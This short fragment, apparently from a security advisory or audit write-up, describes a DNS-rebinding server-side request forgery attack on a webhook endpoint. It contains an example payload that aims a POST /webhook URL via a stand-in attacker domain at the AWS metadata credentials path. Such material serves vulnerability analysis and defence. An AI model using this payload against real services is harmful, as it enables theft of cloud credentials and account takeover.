**Attack Payload**:
```text
Attacker sets up DNS server for evil.attacker.com:
- First query (validation): Returns 8.8.8.8 (safe public IP)
- Second query (actual request): Returns 169.254.169.254 (AWS metadata)

POST /webhook
{"url": "http://evil.attacker.com/latest/meta-data/iam/security-credentials/"}
